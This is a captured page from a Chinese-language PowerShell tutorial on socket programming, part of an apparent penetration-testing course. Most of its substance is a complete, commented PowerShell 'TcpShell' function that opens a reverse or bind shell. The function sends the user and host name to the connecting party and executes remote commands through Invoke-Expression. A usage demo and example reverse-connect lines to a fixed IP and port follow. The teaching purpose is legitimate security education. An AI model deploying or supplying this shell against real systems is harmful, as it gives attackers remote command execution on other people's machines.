+    <span class="hljs-comment">## &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7F13;&#x51B2;&#x533A;&#x83B7;&#x53D6;&#x6570;&#x636E;</span>
+    <span class="hljs-variable">$buffer</span> = <span class="hljs-built_in">new-object</span> System.Byte[] <span class="hljs-number">1024</span> 
+    <span class="hljs-variable">$encoding</span> = <span class="hljs-built_in">new-object</span> System.Text.AsciiEncoding 
+    <span class="hljs-variable">$outputBuffer</span> = <span class="hljs-string">&quot;&quot;</span> 
+    <span class="hljs-variable">$findMore</span> = <span class="hljs-literal">$false</span> 
+
+    <span class="hljs-comment">## &#x4ECE;stream&#x8BFB;&#x53D6;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5199;&#x5230;&#x8F93;&#x51FA;&#x7F13;&#x51B2;&#x533A;</span>
+    <span class="hljs-keyword">do</span> 
+    { 
+        <span class="hljs-built_in">start-sleep</span> -m <span class="hljs-number">1000</span> 
+        <span class="hljs-variable">$findmore</span> = <span class="hljs-literal">$false</span> 
+        <span class="hljs-variable">$stream</span>.ReadTimeout = <span class="hljs-number">1000</span> 
+
+        <span class="hljs-keyword">do</span> 
+        { 
+            <span class="hljs-keyword">try</span> 
+            { 
+                <span class="hljs-variable">$read</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>) 
+
+                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$read</span> <span class="hljs-nomarkup">-gt</span> <span class="hljs-number">0</span>) 
+                { 
+                    <span class="hljs-variable">$findmore</span> = <span class="hljs-literal">$true</span> 
+                    <span class="hljs-variable">$outputBuffer</span> += (<span class="hljs-variable">$encoding</span>.GetString(<span class="hljs-variable">$buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$read</span>)) 
+                } 
+            } <span class="hljs-keyword">catch</span> { <span class="hljs-variable">$findMore</span> = <span class="hljs-literal">$false</span>; <span class="hljs-variable">$read</span> = <span class="hljs-number">0</span> } 
+        } <span class="hljs-keyword">while</span>(<span class="hljs-variable">$read</span> <span class="hljs-nomarkup">-gt</span> <span class="hljs-number">0</span>) 
+    } <span class="hljs-keyword">while</span>(<span class="hljs-variable">$findmore</span>) 
+
+    <span class="hljs-variable">$outputBuffer</span> 
+} 
+. Main
+</code></pre>
+<p>&#x90A3;&#x4E48;&#x81F3;&#x6B64;&#x6211;&#x4EEC;&#x5DF2;&#x7ECF;&#x5B8C;&#x6210;&#x4E86;&#x5BF9;TCP&#x7AEF;&#x53E3;&#x7684;&#x6253;&#x5F00;&#x5E76;&#x83B7;&#x53D6;&#x5BF9;&#x5E94;&#x7684;&#x4FE1;&#x606F;&#xFF0C;&#x5176;&#x4E2D;&#x5F88;&#x591A;&#x7684;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x91CA;&#x4E49;&#x6211;&#x5DF2;&#x7ECF;&#x8BE6;&#x7EC6;&#x7ED9;&#x51FA;&#xFF0C;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x4EE5;TCP&#x4E3A;&#x4F8B;&#xFF0C;&#x7531;&#x4E8E;UDP&#x5E94;&#x7528;&#x573A;&#x666F;&#x76F8;&#x5BF9;&#x4E8E;TCP&#x8F83;&#x5C11;&#xFF0C;&#x5173;&#x4E8E;UDP&#x7684;&#x7F16;&#x5199;&#x53EF;&#x81EA;&#x884C;&#x7F16;&#x5199;&#x3002;</p>
+<p>&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x52A0;&#x4EE5;&#x4FEE;&#x6539;&#x5C31;&#x662F;&#x4E00;&#x4E2A;Powershell&#x5B8C;&#x6210;&#x7684;&#x626B;&#x63CF;&#x5668;&#x4E86;&#xFF0C;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#x5668;&#x6211;&#x4EEC;&#x653E;&#x5728;&#x4E0B;&#x4E00;&#x8282;&#x6765;&#x5206;&#x6790;&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x6700;&#x540E;&#x770B;&#x4E00;&#x4E2A;&#x53CD;&#x5F39;shell&#x7684;ps&#x811A;&#x672C;, &#x540C;&#x6837;&#x5728;&#x6CE8;&#x91CA;&#x4E2D;&#x8BE6;&#x7EC6;&#x89E3;&#x91CA;&#x4E86;&#x4EE3;&#x7801;&#x5757;&#x7684;&#x4F5C;&#x7528;&#x3002;</p>
+<pre><code class="lang-powershell"><span class="hljs-keyword">function</span> TcpShell{ 
+&lt;<span class="hljs-comment">#</span>
+
+.DESCRIPTION
+&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;Shell&#x8FDE;&#x63A5;&#x5DE5;&#x5177;, &#x652F;&#x6301;&#x6B63;&#x5411;&#x4E0E;&#x53CD;&#x5411;
+
+.PARAMETER IPAddress
+Ip&#x5730;&#x5740;&#x53C2;&#x6570;
+
+.PARAMETER Port
+port&#x53C2;&#x6570;
+
+.EXAMPLE
+&#x53CD;&#x5411;&#x8FDE;&#x63A5;&#x6A21;&#x5F0F;
+PS &gt; TcpShell -Reverse -IPAddress <span class="hljs-number">192.168</span>.<span class="hljs-number">254.226</span> -Port <span class="hljs-number">4444</span>
+
+.EXAMPLE
+&#x6B63;&#x5411;&#x8FDE;&#x63A5;&#x6A21;&#x5F0F;
+PS &gt; TcpShell -Bind -Port <span class="hljs-number">4444</span>
+
+.EXAMPLE
+IPV6&#x5730;&#x5740;&#x8FDE;&#x63A5;
+PS &gt; TcpShell -Reverse -IPAddress fe80::<span class="hljs-number">20</span>c:<span class="hljs-number">29</span>ff:fe9d:b983 -Port <span class="hljs-number">4444</span>
+<span class="hljs-comment">#&gt;  </span>
+    <span class="hljs-comment"># &#x53C2;&#x6570;&#x7ED1;&#x5B9A;</span>
+    [CmdletBinding(DefaultParameterSetName=<span class="hljs-string">&quot;reverse&quot;</span>)] <span class="hljs-keyword">Param</span>(
+
+        [Parameter(Position = <span class="hljs-number">0</span>, Mandatory = <span class="hljs-literal">$true</span>, ParameterSetName=<span class="hljs-string">&quot;reverse&quot;</span>)]
+        [Parameter(Position = <span class="hljs-number">0</span>, Mandatory = <span class="hljs-literal">$false</span>, ParameterSetName=<span class="hljs-string">&quot;bind&quot;</span>)]
+        [String]
+        <span class="hljs-variable">$IPAddress</span>,
+
+        [Parameter(Position = <span class="hljs-number">1</span>, Mandatory = <span class="hljs-literal">$true</span>, ParameterSetName=<span class="hljs-string">&quot;reverse&quot;</span>)]
+        [Parameter(Position = <span class="hljs-number">1</span>, Mandatory = <span class="hljs-literal">$true</span>, ParameterSetName=<span class="hljs-string">&quot;bind&quot;</span>)]
+        [Int]
+        <span class="hljs-variable">$Port</span>,
+
+        [Parameter(ParameterSetName=<span class="hljs-string">&quot;reverse&quot;</span>)]
+        [Switch]
+        <span class="hljs-variable">$Reverse</span>,
+
+        [Parameter(ParameterSetName=<span class="hljs-string">&quot;bind&quot;</span>)]
+        [Switch]
+        <span class="hljs-variable">$Bind</span>
+
+    )
+
+
+    <span class="hljs-keyword">try</span> 
+    {
+        <span class="hljs-comment"># &#x5982;&#x679C;&#x68C0;&#x6D4B;&#x5230;Reverse&#x53C2;&#x6570;,&#x5F00;&#x542F;&#x53CD;&#x5411;&#x8FDE;&#x63A5;&#x6A21;&#x5F0F;</span>
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$Reverse</span>)
+        {
+            <span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-variable">$IPAddress</span>,<span class="hljs-variable">$Port</span>)
+        }
+
+        <span class="hljs-comment"># &#x4F7F;&#x7528;&#x6B63;&#x5411;&#x7684;&#x8FDE;&#x63A5;&#x65B9;&#x5F0F;, &#x7ED1;&#x5B9A;&#x672C;&#x5730;&#x7AEF;&#x53E3;, &#x7528;&#x4E8E;&#x6B63;&#x5411;&#x8FDE;&#x63A5;</span>
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$Bind</span>)
+        {
+            <span class="hljs-comment"># Tcp&#x8FDE;&#x63A5;&#x76D1;&#x542C;&#x670D;&#x52A1;&#x7AEF;</span>
+            <span class="hljs-variable">$server</span> = [System.Net.Sockets.TcpListener]<span class="hljs-variable">$Port</span>
+            <span class="hljs-comment"># Tcp&#x8FDE;&#x63A5;&#x5F00;&#x59CB;</span>
+            <span class="hljs-variable">$server</span>.start()    
+            <span class="hljs-comment"># Tcp&#x5F00;&#x59CB;&#x63A5;&#x53D7;&#x8FDE;&#x63A5;</span>
+            <span class="hljs-variable">$client</span> = <span class="hljs-variable">$server</span>.AcceptTcpClient()
+        } 
+
+        <span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream()
+        [byte[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%{<span class="hljs-number">0</span>}
+
+        <span class="hljs-comment"># &#x8FD4;&#x56DE;&#x7ED9;&#x8FDE;&#x63A5;&#x7684;&#x7528;&#x6237;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4ECB;&#x7ECD;,&#x76EE;&#x524D;&#x662F;&#x4F7F;&#x7528;&#x4EC0;&#x4E48;&#x7684;&#x7528;&#x6237;&#x6765;&#x8FD0;&#x884C;powershell&#x7684;, &#x5E76;&#x6253;&#x5370;powershell&#x7684;banner&#x4FE1;&#x606F;</span>
+        <span class="hljs-variable">$sendbytes</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-string">&quot;Windows PowerShell running as user &quot;</span> + <span class="hljs-variable">$env:username</span> + <span class="hljs-string">&quot; on &quot;</span> + <span class="hljs-variable">$env:computername</span> + <span class="hljs-string">&quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;</span>)
+        <span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbytes</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbytes</span>.Length)
+
+        <span class="hljs-comment"># &#x5C55;&#x793A;&#x4E00;&#x4E2A;&#x4EA4;&#x4E92;&#x5F0F;&#x7684;powershell&#x754C;&#x9762;</span>
+        <span class="hljs-variable">$sendbytes</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-string">&apos;PS &apos;</span> + (<span class="hljs-built_in">Get-Location</span>).Path + <span class="hljs-string">&apos;&gt;&apos;</span>)
+        <span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbytes</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbytes</span>.Length)
+
+        <span class="hljs-comment"># while&#x5FAA;&#x73AF;&#x7528;&#x4E8E;&#x6B7B;&#x5FAA;&#x73AF;,&#x4E0D;&#x65AD;&#x5F00;&#x8FDE;&#x63A5;</span>
+        <span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-nomarkup">-ne</span> <span class="hljs-number">0</span>)
+        {
+            <span class="hljs-comment"># &#x6307;&#x5B9A;EncodedText&#x4E3A;Ascii&#x5BF9;&#x8C61;, &#x7528;&#x4E8E;&#x6211;&#x4EEC;&#x540E;&#x9762;&#x7684;&#x8C03;&#x7528;&#x6765;&#x7F16;&#x7801;</span>
+            <span class="hljs-variable">$EncodedText</span> = <span class="hljs-built_in">New-Object</span> -TypeName System.Text.ASCIIEncoding
+            <span class="hljs-comment"># &#x83B7;&#x53D6;&#x7528;&#x6237;&#x7684;&#x8F93;&#x5165;</span>
+            <span class="hljs-variable">$data</span> = <span class="hljs-variable">$EncodedText</span>.GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>)
+            <span class="hljs-keyword">try</span>
+            {
+                <span class="hljs-comment"># &#x8C03;&#x7528;Invoke-Expression&#x6765;&#x6267;&#x884C;&#x6211;&#x4EEC;&#x83B7;&#x53D6;&#x5230;&#x7684;&#x547D;&#x4EE4;, &#x5E76;&#x6253;&#x5370;&#x83B7;&#x5F97;&#x7684;&#x7ED3;&#x679C;</span>
+                <span class="hljs-comment"># Invoke-Expression&#x4F1A;&#x628A;&#x6240;&#x6709;&#x7684;&#x4F20;&#x5165;&#x547D;&#x4EE4;&#x5F53;&#x4F5C;ps&#x4EE3;&#x7801;&#x6267;&#x884C;</span>
+                <span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">Invoke-Expression</span> -Command <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> )
+            }
+            <span class="hljs-keyword">catch</span>
+            {
+                <span class="hljs-comment"># &#x9519;&#x8BEF;&#x8FFD;&#x8E2A;</span>
+                <span class="hljs-built_in">Write-Warning</span> <span class="hljs-string">&quot;Execution of command error.&quot;</span> 
+                <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>
+            }
+            <span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&apos;PS &apos;</span> + (<span class="hljs-built_in">Get-Location</span>).Path + <span class="hljs-string">&apos;&gt; &apos;</span>
+            <span class="hljs-comment"># &#x9519;&#x8BEF;&#x6253;&#x5370;</span>
+            <span class="hljs-variable">$x</span> = (<span class="hljs-variable">$error</span>[<span class="hljs-number">0</span>] | <span class="hljs-built_in">Out-String</span>)
+            <span class="hljs-variable">$error</span>.clear()
+            <span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback2</span> + <span class="hljs-variable">$x</span>
+
+            <span class="hljs-comment"># &#x8FD4;&#x56DE;&#x7ED3;&#x679C;</span>
+            <span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>)
+            <span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length)
+            <span class="hljs-variable">$stream</span>.Flush()  
+        }
+        <span class="hljs-comment"># &#x5173;&#x95ED;&#x8FDE;&#x63A5;</span>
+        <span class="hljs-variable">$client</span>.Close()
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$server</span>)
+        {
+            <span class="hljs-variable">$server</span>.Stop()
+        }
+    }
+    <span class="hljs-keyword">catch</span>
+    {
+        <span class="hljs-comment"># &#x83B7;&#x53D6;&#x9519;&#x8BEF;&#x4FE1;&#x606F;,&#x5E76;&#x6253;&#x5370;</span>
+        <span class="hljs-built_in">Write-Warning</span> <span class="hljs-string">&quot;Something went wrong!.&quot;</span> 
+        <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>
+    }
+}
+</code></pre>
+<p>&#x7B80;&#x5355;&#x7684;&#x5206;&#x6790;&#x5728;&#x6CE8;&#x91CA;&#x5DF2;&#x7ECF;&#x63D0;&#x5230;, &#x5176;&#x4E2D;<code>Invoke-Expression -Command</code>&#x540E;&#x63A5;&#x7684;&#x4EE3;&#x7801;&#x90FD;&#x4F1A;&#x88AB;&#x770B;&#x4F5C;powershell&#x6765;&#x6267;&#x884C;, &#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x6B63;&#x5411;&#x8FDE;&#x63A5;&#x7684;&#x6267;&#x884C;&#x6548;&#x679C;, &#x6211;&#x4EEC;&#x5728;172.16.50.196&#x673A;&#x5668;&#x4E0A;&#x6267;&#x884C;&#x4E0B;&#x9762;&#x7684;&#x4EE3;&#x7801;</p>
+<pre><code class="lang-powershell">PS C:\Users\rootclay&gt; cd .\Desktop\powershell
+PS C:\Users\rootclay\Desktop\powershell&gt; . .\Tcp-Shell.ps1
+PS C:\Users\rootclay\Desktop\powershell&gt; TcpShell -bind -port <span class="hljs-number">4444</span>
+</code></pre>
+<p>&#x8FDE;&#x63A5;&#x8FD9;&#x53F0;&#x673A;&#x5668;, &#x7ED3;&#x679C;&#x5982;&#x4E0B;:
+<img src="https://raw.githubusercontent.com/myoss114/oss/master/uPic/ps4/1.png" alt=""></p>
+<p>&#x53CD;&#x5411;&#x7C7B;&#x4F3C;&#x6267;&#x884C;&#x5373;&#x53EF; </p>
+<p>&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x7684;&#x6700;&#x5F00;&#x59CB;&#x6709;&#x4E00;&#x5927;&#x5757;&#x6CE8;&#x91CA;&#xFF0C;&#x8FD9;&#x4E9B;&#x6CE8;&#x91CA;&#x65E0;&#x7591;&#x662F;&#x589E;&#x5F3A;&#x811A;&#x672C;&#x53EF;&#x8BFB;&#x6027;&#x7684;&#x5173;&#x952E;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x7684;&#x529F;&#x80FD;&#x548C;&#x7528;&#x6CD5;&#x90FD;&#x6709;&#x6E05;&#x6670;&#x7684;&#x8BB2;&#x89E3;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x5982;&#x4F55;&#x5199;&#x8FD9;&#x4E9B;&#x6CE8;&#x91CA;&#x5462;&#x3002;</p>
+<pre><code class="lang-powershell">&lt;<span class="hljs-comment">#</span>
+
+.DESCRIPTION
+&#x63CF;&#x8FF0;&#x533A;&#x57DF;&#xFF0C;&#x4E3B;&#x8981;&#x5199;&#x4F60;&#x811A;&#x672C;&#x7684;&#x4E00;&#x4E9B;&#x63CF;&#x8FF0;&#x3001;&#x7B80;&#x4ECB;&#x7B49;
+
+.PARAMETER IPAddress
+&#x53C2;&#x6570;&#x4ECB;&#x7ECD;&#x533A;&#x57DF;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x63CF;&#x8FF0;&#x4F60;&#x7684;&#x811A;&#x672C;&#x53C2;&#x6570;&#x7684;&#x8BE6;&#x60C5;
+
+.EXAMPLE
+&#x7528;&#x4F8B;&#x63CF;&#x8FF0;&#x533A;&#x57DF;, &#x5BF9;&#x4E8E;&#x4F60;&#x7684;&#x811A;&#x672C;&#x7684;&#x7528;&#x4F8B;&#x7528;&#x6CD5;&#x4E4B;&#x7C7B;&#x90FD;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x91CC;&#x63CF;&#x8FF0;
+
+&#x53CD;&#x5411;&#x8FDE;&#x63A5;&#x6A21;&#x5F0F;
+PS &gt; TcpShell -Reverse -IPAddress <span class="hljs-number">192.168</span>.<span class="hljs-number">254.226</span> -Port <span class="hljs-number">4444</span>
+
+<span class="hljs-comment">#&gt;</span>
+</code></pre>
+<p>&#x6700;&#x540E;&#x6211;&#x4EEC;&#x4F7F;&#x7528;Get-Help&#x547D;&#x4EE4;&#x5C31;&#x80FD;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x7F16;&#x8F91;&#x7684;&#x8FD9;&#x4E9B;&#x6CE8;&#x91CA;&#x5185;&#x5BB9;&#xFF1A;</p>
+<p><img src="https://raw.githubusercontent.com/myoss114/oss/master/uPic/ps4/2.png" alt=""></p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="3. 脚本编写与执行.html" class="navigation navigation-prev " aria-label="Previous page: 脚本编写与执行">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="5. 端口扫描与服务爆破.html" class="navigation navigation-next " aria-label="Next page: 端口扫描与服务爆破">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Scoket网络编程","level":"1.2.3","depth":2,"next":{"title":"端口扫描与服务爆破","level":"1.2.4","depth":2,"path":"5. 端口扫描与服务爆破.md","ref":"5. 端口扫描与服务爆破.md","articles":[]},"previous":{"title":"脚本编写与执行","level":"1.2.2","depth":2,"path":"3. 脚本编写与执行.md","ref":"3. 脚本编写与执行.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"4. Scoket网络编程.md","mtime":"2020-04-13T09:48:14.634Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-04-13T09:56:21.455Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
